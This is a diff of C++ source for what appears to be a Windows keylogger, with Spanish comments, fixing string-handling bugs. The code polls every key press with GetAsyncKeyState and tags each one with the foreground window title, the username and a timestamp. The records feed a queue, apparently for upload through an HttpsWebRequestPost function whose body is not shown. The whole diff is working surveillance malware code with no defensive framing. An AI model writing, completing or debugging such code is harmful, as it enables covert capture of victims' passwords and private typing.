@@ -113,12 +113,9 @@ string HttpsWebRequestPost(string domain, string url, string dat) {
 }
 
 //Variables globales de entorno de ejecución y sus función Entorno() para asignarlas
-//string window;
-char* window;
-//string timestamp;
-char* timestamp;
-//string name;
-char* name;
+string window;
+string timestamp;
+string name;
 
 void Entorno() {
 	const int SizeOfTitleBarText = GetWindowTextLength(GetForegroundWindow());
@@ -128,8 +125,7 @@ void Entorno() {
 	free(wnd_title);
 
 	std::time_t time = std::time(nullptr);
-	//timestamp = std::to_string(time);
-	timestamp = (char*)time;
+	timestamp = std::to_string(time);
 
 	TCHAR username[UNLEN + 1];
 	DWORD username_len = UNLEN + 1;
@@ -139,23 +135,18 @@ void Entorno() {
 
 typedef struct tecla {
 	string tiempo;
-	//char* tiempo;
 	string ventana;
-	//char* ventana;
 	string key;
-	//char* key;
 	string nombre;
-	//char* nombre;
 } type_key;
 
 type_key str_key;
 
 bool TeclasPulsadas(int tecla) {
 	Entorno();
-	//En lugar de asignar las variables de entorno aquí las mando directamente al puntero send_key en la función main()
-	//str_key.ventana = window;
-	//str_key.tiempo = timestamp;
-	//str_key.nombre = "" + name + "_" + timestamp;
+	str_key.ventana = window;
+	str_key.tiempo = timestamp;
+	str_key.nombre = "" + name + "_" + timestamp;
 
 	switch (tecla) {
 	case VK_SPACE:
@@ -467,13 +458,7 @@ int main() {
 			if (GetAsyncKeyState(key) == -32767) {
 
 				if (TeclasPulsadas(key) == FALSE) {
-					//str_key.ventana = window;
-					send_key->ventana = window;
-					//str_key.tiempo = timestamp;
-					send_key->tiempo = timestamp;
-					//str_key.nombre = "" + name + "_" + timestamp;
-					//send_key->nombre = "" + name + "_" + timestamp;
-					//str_key.key = key;
+					str_key.key = key;
 					send_key->key = key;
 
 					Node* a = getNode(send_key);
